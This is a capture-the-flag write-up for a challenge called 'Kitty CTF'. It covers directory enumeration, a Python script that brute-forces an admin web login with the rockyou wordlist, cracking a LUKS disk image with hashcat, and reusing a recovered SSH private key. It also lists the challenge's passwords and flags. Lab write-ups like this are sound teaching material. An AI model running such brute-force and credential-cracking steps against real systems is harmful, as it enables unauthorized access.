---
title: Kitty CTF
description: Processus made a CTF
date: 06/01/2022
---

# Kitty CTF

This CTF is from [ProcessusThief](https://twitter.com/ProcessusT).

## Enumeration :

After completing the captcha and deploying the docker I used **dirb** to find hidden directories.

```text
/support
   └─> index.php
```

## Brute-forcing

The `index.php` file contained a formular so I first checked if an SQL injection was possible, unfortunatly it wasn't. I then tried a simple brute-force attack with python. Here's the program I made :

```py
import requests

wl = open("/media/HDD/Hacking/wordlist/rockyou.txt","r", encoding='latin-1') # assuming you have downloaded the rockyou
wl = [x.replace('\
','') for x in wl.readlines()]
i = 0

while True:
    r = requests.post('http://51.91.141.245:45272/support/index.php', data={'username': 'admin', 'password': wl[i]})
    if 'Incorrect username or password' not in r.text:
        print(r.text, wl[i])
    print(i)
    i += 1
```

The script quickly found the password :
|username|password|
|-|-|
|admin|zxcvbnm|

## SSH access

After connecting I was greeted with a homepage containing multiple **pdf** files.
In one of them I got the ssh password along with a user and with the first flag:
**`FL4G{k1tty-0n3-G@r1z0v}`**
|username|password|
|-|-|
|garizov|Russkaya_R0d1na|

Once on the machine I found a note left by `castillo` (another user) saying that he had plugged a USB drive containing encrypted data.
I then headed to the `/media` directory and found a `richard.img` file.

## Decryption

Having very limited knowledge in cryptography I will try to stay as precise as possible :sweat_smile:.
Using **binwalk** I found these informations :

```text
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             LUKS_MAGIC version 0x1 aes sha256
```

Then I checked on [hashcat-example](https://hashcat.net/wiki/doku.php?id=example_hashes) to see if hashcat could decrypt **LUKS** partition, luckily it could.
So I used **hashcat** to crack the img's encryption key :
`key : angels`

After mounting the img file I found it contained an `id_rsa` file, which turned out to be **castillo's SSH private key**.

## SSH access #2

I connected as user castillo with his private key and got the last flag : **`FL4G{Kitty-two_W3_W1LL_C4TCH_TH3M_4LL}`**

<br>

### Thanks for reading :)
